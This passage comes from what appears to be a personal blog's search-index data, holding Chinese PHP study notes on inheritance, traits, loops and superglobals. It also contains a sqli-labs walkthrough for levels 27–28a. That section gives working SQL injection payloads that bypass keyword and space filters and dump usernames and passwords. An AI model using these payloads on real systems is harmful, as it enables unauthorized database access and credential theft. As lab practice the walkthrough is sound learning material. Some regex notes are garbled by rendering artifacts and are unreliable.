-&gt;age.&quot;。&lt;br&gt;&quot;；&#125;&#125;//声明一个学生类，使用extends关键字扩展（继承）person类class Student extends Person &#123;private $school; //在学生类中声明一个所在学校school的成员属性//覆盖父类中的构造方法，在参数列表中添加一个学校属性，用来创建对象并初始化成员属性function construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=1,$school=&quot;&quot;)&#123;$this -&gt;name = $name;$this -&gt;sex = $sex;$this -&gt;age = $age;$this -&gt;school = $school;&#125;function study()&#123;echo $this -&gt;name.&quot;正在&quot;.$this -&gt;school.&quot;学习&lt;br&gt;&quot;;&#125;//定义一个和父类中同名的方法，将父类中的说话方法覆盖并重写，多说出所在的学校名称function say()&#123;echo &quot;我的名字：&quot;.$this -&gt;name.&quot;，性别：&quot;.$this -&gt;sex.&quot;，年龄：&quot;.$this -&gt;age.&quot;，在&quot;.$this -&gt;school.&quot;学校上学&lt;br&gt;&quot;;&#125;&#125;$student= new Student(&quot;张三&quot;,&quot;男&quot;,20,&quot;edu&quot;); //创建一个学生对象，并传给一个学校名称参数$student -&gt; say(); //调用学生类中覆盖父类的说话方法?&gt; 改程序运行后输出的结果为： 我的名字叫：张三，性别：男，我的年龄是：20，在 edu 学校上学 在 PHP 中，提供了在子类重载的方法中调用父类被覆盖方法的功能。这样就可以在子类重写的方法中，继续使用从父类继承过来并被覆盖的方法，然后再按要求多添加一些新功能。调用的格式是使用 “parent: 方法名” 在子类的重载方法中调用父类中被覆盖的方法。将上例中的代码修改一下，在子类重写的构造方法中使用 “parent::construct ()” 调用父类中被覆盖的构造方法，再多添加一条对子类中新扩展的成员属性初始化的代码。在子类中重写的 say () 方法中使用 “parent::say ()” 调用父类中被覆盖的 say () 方法，再添加上输出子类成员属性的功能。 代码如下所示： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass Person&#123;protected $name;protected $sex;protected $Wage;function construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=1)&#123;$this -&gt;name = $name;$this -&gt;sex = $sex;$this -&gt;age = $age;&#125;//在人类中声明一个通用的说话方法，介绍一下自己function say()&#123;echo &quot;我的名字：&quot;.$this-&gt; name.&quot;，性别：&quot;.$this -&gt;sex.&quot;，年龄：&quot;.$this -&gt;age.&quot;。&lt;br&gt;&quot;；&#125;&#125;//声明一个学生类，使用extends关键字扩展（继承）person类class Student extends Person &#123;private $school; //在学生类中声明一个所在学校school的成员属性//覆盖父类中的构造方法，在参数列表中添加一个学校属性，用来创建对象并初始化成员属性function construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=1,$school=&quot;&quot;)&#123;//调用父类中被覆盖的构造方法，为从父类中集成过来额出行赋初值parent::construct($name,$sex,$age);$this -&gt;school = $school;&#125;function study()&#123;echo $this -&gt;name.&quot;正在&quot;.$this -&gt;school.&quot;学习&lt;br&gt;&quot;;&#125;//定义一个和父类中同名的方法，将父类中的说话方法覆盖并重写，多说出所在的学校名称function say()&#123;parent::say(); //调用父类中被本方法覆盖掉的方法echo &quot;在&quot;.$this -&gt;school.&quot;学校上学&lt;br&gt;&quot;;&#125;&#125;$student= new Student(&quot;张三&quot;,&quot;男&quot;,20,&quot;edu&quot;); //创建一个学生对象，并传给一个学校名称参数$student -&gt; say(); //调用学生类中覆盖父类的说话方法?&gt; 具体学习链接：php 中 parent:: 是如何使用的？-php 教程 - PHP 中文网 # 范围解析操作符 （::） 范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。 1、在类的外部使用：：操作符 例子： 12345678910&lt;?phpclass MyClass &#123; const CONST_VALUE = &#x27;A constant value&#x27;;&#125;$classname = &#x27;MyClass&#x27;;echo $classname::CONST_VALUE;echo MyClass::CONST_VALUE;?&gt; 2、在类定义内部使用 :: 3、调用父类的方法 例子： 12345678910111213141516171819202122&lt;?phpclass MyClass&#123; protected function myFunc() &#123; echo &quot;MyClass::myFunc()\\n&quot;; &#125;&#125;class OtherClass extends MyClass&#123; // 覆盖了父类的定义 public function myFunc() &#123; // 但还是可以调用父类中被覆盖的方法 parent::myFunc(); echo &quot;OtherClass::myFunc()\\n&quot;; &#125;&#125;$class = new OtherClass();$class-&gt;myFunc();?&gt; 输出： 具体学习链接：PHP: 范围解析操作符 （::） - Manual # extends extends 在类的声明中，通过此 “关键字” 来继承一个类。 extends 是继承某个类，继承之后可以使用父类的方法，也可以重写父类的方法； extends 是继承父类，如果类被声明为 final，则不能被继承。PHP 中不支持多重继承（Java 也不支持，而 C++ 是支持多重继承的），如：class B (子) extends A (父) extends 可以实现父类，也可以调用父类初始化 this.parent ()，而且会覆盖父类定义的变量或者函数。 学习链接：[PHP 中 extends、implements、abstract、interface 的区别 - 小识堂 - 博客园 (cnblogs.com)](https://www.cnblogs.com/cutcop/p/13203056.html#:~:text=1. extends 在类的声明中，通过此 “关键字” 来继承一个类。 2. extends, 是继承某个类 %2C 继承之后可以使用父类的方法 %2C 也可以重写父类的方法 %3B 3. extends 是继承父类，如果类被声明为 final，则不能被继承。) # php 中 public 的用法是什么 访问控制修饰符 12345形式：class 类名&#123; 访问控制修饰符 属性或方法定义；&#125; 有 3 个访问修饰符： public 公共的：在所有位置都可访问（使用）。 protected 受保护的：只能再该类内部和该类的子类或父类中访问（使用）。 private 私有的：只能在该类内部访问（使用）。 # trait 1.trait 的功能和 class 的功能是很接近的，都可以定义一个类，并赋予方法 2. 但是如果你要让这个类被中的方法被继承使用，那么就需要使用 trait 例子： 123456789101112131415161718192021&lt;?phpclass cup&#123; function water() &#123; echo &#x27;我可以装水&#x27;; &#125;&#125;class bowl&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup; //此时你如果想要这个tools同时拥有碗和杯子的功能就不可以了。&#125;?&gt; 结果： 此时会报错 但是当你把前两个 class 换成 trait 时，就可以执行这个功能 123456789101112131415161718192021222324&lt;?phptrait cup&#123; function water() &#123; echo &#x27;我可以装水&#x27;; &#125;&#125;trait bowl&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup;&#125;$makecup = new tools();$makecup -&gt; water();//-和&gt;之间不可以有空格?&gt; 结果： trait 嵌套 trait 123456789101112131415161718192021222324252627282930313233&lt;?phptrait test&#123; function demo() &#123; echo&quot;正在测试&quot;; &#125;&#125;trait cup&#123; use test; function water() &#123; echo &#x27;我可以装水&#x27;; &#125;&#125;trait bowl&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup;&#125;$makecup = new tools();$makecup -&gt; water();//-和&gt;之间不可以有空格$makecup -&gt; demo();?&gt; 结果： 多个 trait 12345678910111213141516171819202122232425262728293031323334&lt;?phptrait test&#123; function demo() &#123; echo&quot;正在测试&quot;; &#125;&#125;trait cup&#123; use test; function water() &#123; echo &#x27;我可以装水&#x27;; &#125;&#125;trait bowl&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup,bowl;&#125;$makecup = new tools();$makecup -&gt; water();//-和&gt;之间不可以有空格$makecup -&gt; demo();$makecup -&gt; food();?&gt; 结果： 避免同名方法 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phptrait test&#123; function demo() &#123; echo&quot;正在测试&quot;; &#125;&#125;trait cup&#123; use test; function water() &#123; echo &#x27;我可以装水&#x27;; &#125; function food() &#123; echo&quot;我可以装一点点食物&quot;; &#125;&#125;trait bowl&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup,bowl &#123; cup::food insteadof bowl; &#125;&#125;$makecup = new tools();$makecup -&gt; food();?&gt; 输出： 更改名字来使用原本同名的方法 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phptrait test&#123; function demo() &#123; echo&quot;正在测试&quot;; &#125;&#125;trait cup&#123; use test; function water() &#123; echo &#x27;我可以装水&#x27;; &#125; function food() &#123; echo&quot;我可以装一点点食物&quot;; &#125;&#125;trait bowl&#123; function food() &#123; echo&quot;我可以装食物&quot;; &#125;&#125;class tools&#123; use cup,bowl &#123; cup::food insteadof bowl; bowl::food as wafood; &#125;&#125;$makecup = new tools();$makecup -&gt; food();echo &#x27;&lt;br&gt;&#x27;;$makecup -&gt; wafood();?&gt; 输出： # insteadof insteadof 关键字允许您在多个 trait 具有同名方法时选择应该从哪个 trait 中获取方法。 例子： 1234567891011121314151617181920212223242526272829303132&lt;?phptrait message1 &#123; public function msgA() &#123; echo &quot;My favorite color is red. &quot;; &#125; public function msgB() &#123; echo &quot;My favorite number is 5. &quot;; &#125;&#125;trait message2 &#123; public function msgA() &#123; echo &quot;My favorite color is blue. &quot;; &#125; public function msgB() &#123; echo &quot;My favorite number is 7. &quot;; &#125;&#125;class MyClass &#123; use message1, message2 &#123; message1::msgA insteadof message2; message2::msgB insteadof message1; &#125;&#125;$obj = new MyClass();$obj-&gt;msgA();$obj-&gt;msgB();?&gt; 输出： My favorite color is red. My favorite number is 7. 学习链接：PHP insteadof 关键字 (w3schools.cn) # __TRAIT__ 123456789101112131415161718192021&lt;?phpclass Base &#123; public function sayHello() &#123; echo &#x27;Hello &#x27;; &#125;&#125; trait SayWorld &#123; public function sayHello() &#123; parent::sayHello(); echo &#x27;World!&#x27;; &#125;&#125; class MyHelloWorld extends Base &#123; use SayWorld;&#125; $o = new MyHelloWorld();$o-&gt;sayHello();?&gt; 输出： Hello World! # __METHOD__ 类的方法名。返回该方法被定义时的名字（区分大小写）。 123456&lt;?phpfunction test() &#123; echo &#x27;函数名为：&#x27; . __METHOD__ ;&#125;test();?&gt; 输出： 函数名为：test # __NAMESPACE__ 当前命名空间的名称（区分大小写）。此常量是在编译时定义的 12345&lt;?phpnamespace MyProject; echo &#x27;命名空间为：&quot;&#x27;, __NAMESPACE__, &#x27;&quot;&#x27;; // 输出 &quot;MyProject&quot;?&gt; 输出： 命名空间为：“MyProject”","categories":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/categories/php%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"sqli-labs-27-28a","slug":"sqli-labs-27-28a","date":"2023-01-15T11:10:26.000Z","updated":"2024-11-08T10:10:15.690Z","comments":true,"path":"2023/01/15/sqli-labs-27-28a/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/15/sqli-labs-27-28a/","excerpt":"# sqli-labs-27-28a","text":"# sqli-labs-27-28a # sqli-labs-27 这里可以看到，我们需要混合大小写来绕过，源代码中多次过滤，双写过滤会被再次过滤掉 select 就无法双写 单看源代码，我觉得 union 是可以使用双写过滤 正则表达式: 正则表达式 – 语法 | 菜鸟教程 (runoob.com) 这一次的正则表达式和前面几个又有点不太一样，反斜杠后面又多了一些字母 作用如下： // 修正符:i 不区分大小写的匹配；IgnoreCase ​ // 如:&quot;/abc/i&quot; 可以与 abc 或 aBC 或 ABc 等匹配； // 修正符：g 表示全局匹配 // 修正符:m 将字符串视为多行，不管是哪行都能匹配；Multiline ​ 例:// 模式为:mode=&quot;/abc/m&quot;;​//要匹配的字符串为:mode=&quot;/abc/m&quot;; ​ //要匹配的字符串为:mode=&quot;/abc/m&quot;;​//要匹配的字符串为:str=“bcefg5e\\nabcdfe” ​ // 注意其中 \\n, 换行了；abc 换到了下一行； ​ //str和str和str和 mode 仍可以匹配，修正符 m 使得多行也可匹配； // 修正符:s 将字符串视为单行，换行符作为普通字符；Singleline ​ 例:// 模式为:mode=&quot;/pr.y/&quot;;​//要匹配字符串为:mode=&quot;/pr.y/&quot;; ​ //要匹配字符串为:mode=&quot;/pr.y/&quot;;​//要匹配字符串为:str=“pr\\ny”; ​ // 两者不可匹配；. 是除了换行以外的字符可匹配； ​ // 修改下模式为:$mode=&quot;/pr.y/s&quot;; ​ // 其中修正符 s 将 \\n 视为普通字符，即不是换行； ​ // 最后两者可以匹配； // 修正符:x 将模式中的空白忽略； // 修正符:A 强制从目标字符串开头匹配； ​ 例://mode=&quot;/abc/A&quot;;​//可以与mode=&quot;/abc/A&quot;; ​ //可以与mode=&quot;/abc/A&quot;;​//可以与 str=&quot;abcsdfi&quot; 匹配， ​ // 不可以与str2=&quot;sdsdabc&quot;匹配;​//因为str2=&quot;sdsdabc&quot;匹配; ​ //因为str2=&quot;sdsdabc&quot;匹配;​//因为 str2 不是以 abc 开头； // 修正符:D 如果使用 $ 限制结尾字符，则不允许结尾有换行； ​ 例:// 模式为:mode=&quot;/abcmode=&quot;/abcmode=&quot;/abc/&quot;; ​ // 可以与最后有换行的str=\"adshabc\\n\"匹配; ​ //元子符会忽略最后的换行 \\n; ​ // 如果模式为:mode=&quot;/abc/D&quot;,​//则不能与mode=&quot;/abc/D&quot;, ​ //则不能与mode=&quot;/abc/D&quot;,​//则不能与 str=&quot;adshabc\\n&quot; 匹配， ​ // 修正符 D 限制其不可有换行；必需以 abc 结尾； // 修正符:U 只匹配最近的一个字符串；不重复匹配； ​ 例: ​ 如模式为: ​ $mode=&quot;/a.*c/&quot;; ​ str=&quot;abcabbbcabbbbbc&quot;;​pregmatch(str=&quot;abcabbbcabbbbbc&quot;; ​ preg_match(str=&quot;abcabbbcabbbbbc&quot;;​pregm​atch(mode,str,str,str,content); ​ echo $content [0];// 输出:abcabbbcabbbbbc; ​ // 如果mode=&quot;/a.∗c/&quot;;变成mode=&quot;/a.*c/&quot;;变成mode=&quot;/a.∗c/&quot;;变成 mode=&quot;/a.*c/U&quot;; ​ // 则只匹配最近一个字符串，输出:abc; // 修正符:e 配合函数 preg_replace () 使用， 可以把匹配来的字符串当作正则表达式执行； 来源:(3 条消息) 正则表达式中模式修正符作用详解（i、g、m、s、x、e）_cute_325 的博客 - CSDN 博客 1url?id=1&#x27; 页面报错 单引号闭合 这里我尝试使用 order by 才字段数失败了，直接使用 union select 来猜字段 12url?id=999&#x27;%0aununionion%0aSeLeCt%0a1%0aand%0a&#x27;1&#x27;=&#x27;1url?id=999&#x27;%0aununionion%0aSeLeCt%0a1,2,3%0aand%0a&#x27;1&#x27;=&#x27;1 爆库 注意回显点是 2,1 并不是以前的 2,3 1url?id=999&#x27;%0aununionion%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(schema_name)%0afrom%0ainformation_schema.schemata),3%0aand%0a&#x27;1&#x27;=&#x27;1 当前数据库为 security 爆表 1url?id=999&#x27;%0aununionion%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;),3%0aand%0a&#x27;1&#x27;=&#x27;1 爆列 1url?id=999&#x27;%0aununionion%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=&#x27;security&#x27;%0aand%0atable_name=&#x27;users&#x27;),3%0aand%0a&#x27;1&#x27;=&#x27;1 爆字段 1url?id=999&#x27;%0aununionion%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(username,&#x27;^&#x27;,password)%0afrom%0ausers),3%0aand%0a&#x27;1&#x27;=&#x27;1 # sqli-labs-27a 和上一关没有什么区别， 12url?id=1&#x27; //页面显示正确url?id=1&quot; //页面显示错误 但是不报错 尝试闭合 1url?id=1&quot;%0aand%0a&quot;1&quot;=&quot;1 页面显示正常 union select 判断字段数 1url?id=999&quot;%0a%0aununionion%0aSELect%0a1,2,3%0aand%0a&quot;1&quot;=&quot;1 后续爆库爆表等 payload 就不一一列出了和 27 关一模一样，就差在单引号闭合和双引号闭合了 # sql-labs-28 代码中先过滤 /，*，-，#，空格，+，最后过滤 union\\s+select（且不区分大小写） union select 是作为一个组合过滤的，并且只过滤一次，因此可以用整体的双写绕过 12url?id=1&#x27; //页面显示异常url?id=1&quot; //页面显示正常 无回显且说明本关闭合含有单引号 尝试是否还有括号 加单引号报错，但是没给错误提示，所以还要测试是否由 **)** 由 2’&amp;&amp;‘1’=‘1 如果只是’，返回结果是 id=2 的结果，是，), 则语句变为 (‘2’&amp;&amp;‘1’=‘1’),Mysql 将 2 作为布尔值，返回的是 id=1 的结果 由 1’;%00 和 1’)%00, 谁回显正常，就是谁 1’)||‘1’=('1, 若回显正常，有小括号，反之没有 1?id=1&#x27;)||&#x27;1&#x27;=(&#x27;1 回显正常，有小括号 union select 获取字段数和回显点 1url?id=999&#x27;)%0aununion%0aselection%0aselect%0a1,2,3%0aand%0a(&#x27;1&#x27;)=(&#x27;1 2,1 回显 爆库爆表等 payload 就不一一列出了和前两关一样，注意闭合 # sqli-labs-28a 看到代码震惊了比前面还佛系 1url?id=1&#x27;)||(&#x27;1&#x27;)=(&#x27;1 闭合也和上一关一模一样 1url?id=999&#x27;) ununion selection select 1,2,3 and(&#x27;1&#x27;)=(&#x27;1 连空格都没有过滤 具体 payload 就不一一列出了","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"php学习2023-01-14","slug":"php学习2023-01-14","date":"2023-01-14T11:00:21.000Z","updated":"2024-11-08T10:08:29.269Z","comments":true,"path":"2023/01/14/php学习2023-01-14/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/14/php%E5%AD%A6%E4%B9%A02023-01-14/","excerpt":"# php 学习 (while、for 循环)","text":"# php 学习 (while、for 循环) 在 PHP 中，提供了下列循环语句： while - 只要指定的条件成立，则循环执行代码块 do…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环 for - 循环执行代码块指定的次数 foreach - 根据数组中每个元素来循环代码块 # while 语法： 1234while(条件)&#123; 要执行的代码;&#125; 示例： 下面的实例首先设置变量 i 的值为 1 ($i=1;)。 然后，只要 i 小于或者等于 5，while 循环将继续运行。循环每运行一次，i 就会递增 1： 12345678&lt;?php $i=1; while($i&lt;=5) &#123; echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;; $i++; &#125;?&gt; 输出结果： The number is 1 The number is 2 The number is 3 The number is 4 The number is 5 # do_while do…while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。 语法： 12345do&#123; 要执行的代码;&#125;while (条件); 示例： 下面的实例首先设置变量 i 的值为 1 ($i=1;)。 然后，开始 do…while 循环。循环将变量 i 的值递增 1，然后输出。先检查条件（i 小于或者等于 5），只要 i 小于或者等于 5，循环将继续运行： 123456789&lt;?php $i = 1; do &#123; $i++; echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;; &#125; while ($i &lt;= 5);?&gt; 输出： The number is 2 The number is 3 The number is 4 The number is 5 The number is 6 # for 语法： 1234for (初始值; 条件; 增量)&#123; 要执行的代码;&#125; 示例： 123456&lt;?php for ($i = 1; $i &lt;= 5; $i++) &#123; echo &quot;数字为 &quot; . $i . &quot;&lt;br&gt;&quot;; &#125;?&gt; 输出： 数字为 1 数字为 2 数字为 3 数字为 4 数字为 5 # foreach 语法： 1234foreach ($array as $value)&#123; 要执行代码;&#125; 每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。 1234foreach ($array as $key =&gt; $value)&#123; 要执行代码;&#125; 每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。 示例： 1234567&lt;?php $x = array ( &quot;Google&quot;, &quot;Baidu&quot;, &quot;Bing&quot;); foreach ($x as $value) &#123; echo $value . &quot;&lt;br&gt;&quot;; &#125;?&gt; 输出： Google Baidu Bing 1234567&lt;?php $x = array ( 1 =&gt; &quot;Google&quot;, 2 =&gt; &quot;Baidu&quot;, 3 =&gt; &quot;Bing&quot;); foreach ( $x as $key =&gt; $value ) &#123; echo &quot;key 为&quot; . $key . &quot;, 对应的 value 为 &quot; . $value . &quot;&lt;br&gt;&quot;; &#125;?&gt; 输出： key 为 1, 对应的 value 为 Google key 为 2, 对应的 value 为 Baidu key 为 3, 对应的 value 为 Bing 尝试写了一道简单的冒泡排序 1234567891011121314151617181920&lt;?php $num = array ( 3, 6, 2, 99, 7, 88 ); $len = count( $num ); for ( $i = $len - 1; $i &gt; 0; $i-- ) &#123; for ( $j = 0; $j &lt; $i; $j++ ) &#123; if ( $num[$j] &gt; $num[$j + 1] ) &#123; $tmp = $num[$j]; $num[$j] = $num[$j + 1]; $num[$j + 1] = $tmp; &#125; &#125; &#125; for ( $t = 0; $t &lt; $len; $t++ ) &#123; echo $num[$t] . &quot;&lt;br&gt;&quot;; &#125;?&gt; 输出： 2 3 6 7 88 99","categories":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/categories/php%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习2023-01-13","slug":"php学习2023-01-13","date":"2023-01-13T11:58:23.000Z","updated":"2024-11-08T10:08:13.474Z","comments":true,"path":"2023/01/13/php学习2023-01-13/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/13/php%E5%AD%A6%E4%B9%A02023-01-13/","excerpt":"# php 学习 (数组排序、超级全局变量)","text":"# php 学习 (数组排序、超级全局变量) # 数组排序 sort () - 对数组进行升序排列 rsort () - 对数组进行降序排列 asort () - 根据关联数组的值，对数组进行升序排列 ksort () - 根据关联数组的键，对数组进行升序排列 arsort () - 根据关联数组的值，对数组进行降序排列 krsort () - 根据关联数组的键，对数组进行降序排列 sort () - 对数组进行升序排列 1234567891011&lt;?php $car = array( &quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot; ); sort($car); echo $car[0]; echo &#x27;&lt;br&gt;&#x27;; echo $car[1]; echo &#x27;&lt;br&gt;&#x27;; echo $car[2]; ?&gt; 再来通过一个全是数字的数组来看看 12345&lt;?php $num = array( 4, 6, 3, 22, 24, 1 ); sort($num); echo $num[0] . &quot;,&quot; . $num[1] . &quot;,&quot; . $num[2] . &quot;,&quot; . $num[3] . &quot;,&quot; . $num[4] . &quot;,&quot; . $num[5];?&gt; 输出 1,3,4,6,22,24 其余的函数就不一一列举出来了，用法是一致的 具体的可以通过菜鸟教程学习 PHP 数组排序 | 菜鸟教程 (runoob.com) # 超级全局变量 PHP 超级全局变量列表: $GLOBALS $_SERVER $_REQUEST $_POST $_GET $_FILES $_ENV $_COOKIE $_SESSION # $GLOBALS 例子如下: 123456789101112&lt;?php $x = 75; $y = 25; function addition() &#123; $GLOBALS[&#x27;z&#x27;] = $GLOBALS[&#x27;x&#x27;] + $GLOBALS[&#x27;y&#x27;]; &#125; addition(); echo $z; ?&gt; 以上实例中 z 是一个 $GLOBALS 数组中的超级全局变量，该变量同样可以在函数外访问。 输出结果是 100 # $_SERVER $_SERVER 是一个包含了诸如头信息 (header)、路径 (path)、以及脚本位置 (script locations) 等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。 12345678910111213&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;]; echo &quot;&lt;br&gt;&quot;; echo $_SERVER[&#x27;SERVER_NAME&#x27;]; echo &quot;&lt;br&gt;&quot;; echo $_SERVER[&#x27;HTTP_HOST&#x27;]; echo &quot;&lt;br&gt;&quot;; echo $_SERVER[&#x27;HTTP_REFERER&#x27;]; echo &quot;&lt;br&gt;&quot;; echo $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]; echo &quot;&lt;br&gt;&quot;; echo $_SERVER[&#x27;SCRIPT_NAME&#x27;];?&gt; 元素 / 代码 描述 $_SERVER[‘PHP_SELF’] 当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/test.php/foo.bar 的脚本中使用 $_SERVER [‘PHP_SELF’] 将得到 /test.php/foo.bar。FILE 常量包含当前 (例如包含) 文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 $_SERVER[‘GATEWAY_INTERFACE’] 服务器使用的 CGI 规范的版本；例如，“CGI/1.1”。 $_SERVER[‘SERVER_ADDR’] 当前运行脚本所在的服务器的 IP 地址。 $_SERVER[‘SERVER_NAME’] 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: www.runoob.com) $_SERVER[‘SERVER_SOFTWARE’] 服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache/2.2.24) $_SERVER[‘SERVER_PROTOCOL’] 请求页面时通信协议的名称和版本。例如，“HTTP/1.0”。 $_SERVER[‘REQUEST_METHOD’] 访问页面使用的请求方法；例如，“GET”, “HEAD”，“POST”，“PUT”。 $_SERVER[‘REQUEST_TIME’] 请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496) $_SERVER[‘QUERY_STRING’] query string（查询字符串），如果有的话，通过它进行页面访问。 $_SERVER[‘HTTP_ACCEPT’] 当前请求头中 Accept: 项的内容，如果存在的话。 $_SERVER[‘HTTP_ACCEPT_CHARSET’] 当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：“iso-8859-1,*,utf-8”。 $_SERVER[‘HTTP_HOST’] 当前请求头中 Host: 项的内容，如果存在的话。 $_SERVER[‘HTTP_REFERER’] 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。) $_SERVER[‘HTTPS’] 如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。 $_SERVER[‘REMOTE_ADDR’] 浏览当前页面的用户的 IP 地址。 $_SERVER[‘REMOTE_HOST’] 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。 $_SERVER[‘REMOTE_PORT’] 用户机器上连接到 Web 服务器所使用的端口号。 $_SERVER[‘SCRIPT_FILENAME’] 当前执行脚本的绝对路径。 $_SERVER[‘SERVER_ADMIN’] 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：someone@runoob.com) $_SERVER[‘SERVER_PORT’] Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。 $_SERVER[‘SERVER_SIGNATURE’] 包含了服务器版本和虚拟主机名的字符串。 $_SERVER[‘PATH_TRANSLATED’] 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。 $_SERVER[‘SCRIPT_NAME’] 包含当前脚本的路径。这在页面需要指向自己时非常有用。FILE 常量包含当前脚本 (例如包含文件) 的完整路径和文件名。 $_SERVER[‘SCRIPT_URI’] URI 用来指定要访问的页面。例如 “/index.html”。 # $_REQUEST PHP $_REQUEST 用于收集 HTML 表单提交的数据。 以下实例显示了一个输入字段（input）及提交按钮 (submit) 的表单 (form)。 当用户通过点击 “Submit” 按钮提交表单数据时，表单数据将发送至标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的 PHP 文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据: 补充一下：REQUEST：具有POST[]和_POST[]和P​OST[]和_GET [] 的功能，但是REQUEST[]会比较慢。通过post和get方法提交的所有数据都可以通过_REQUEST[]会比较慢。通过post和get方法提交的所有数据都可以通过R​EQUEST[]会比较慢。通过post和get方法提交的所有数据都可以通过 REQUEST 数组获得 123456789101112131415&lt;html&gt;&lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;];?&gt;&quot;&gt;Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; &lt;?php $name = $_REQUEST[&#x27;fname&#x27;]; echo $name; ?&gt; &lt;/body&gt;&lt;/html&gt; # $_POST PHP $_POST 被广泛应用于收集表单数据，在 HTML form 标签的指定该属性：&quot;method=“post”。 以下实例显示了一个输入字段（input）及提交按钮 (submit) 的表单 (form)。 当用户通过点击 “Submit” 按钮提交表单数据时，表单数据将发送至标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的 PHP 文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_POST 来收集表单中的 input 字段数据: 123456789101112131415&lt;html&gt;&lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;];?&gt;&quot;&gt;Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; &lt;?php $name = $_POST[&#x27;fname&#x27;]; echo $name; ?&gt; &lt;/body&gt;&lt;/html&gt; # $_GET PHP $_GET 同样被广泛应用于收集表单数据，在 HTML form 标签的指定该属性：&quot;method=“get”。 $_GET 也可以收集 URL 中发送的数据。 假定我们有一个包含参数的超链接 HTML 页面： 12345678&lt;html&gt;&lt;body&gt;&lt;a href=&quot;test_get.php?subject=PHP&amp;web=runoob.com&quot;&gt;Test $GET&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 当用户点击链接 “Test $GET”, 参数 “subject” 和 “web” 将发送至 &quot;test_get.php&quot;, 你可以在 “test_get.php” 文件中使用 $_GET 变量来获取这些数据。 以下实例显示了 “test_get.php” 文件的代码: 12345678910&lt;html&gt;&lt;body&gt; &lt;?php echo &quot;Study &quot; . 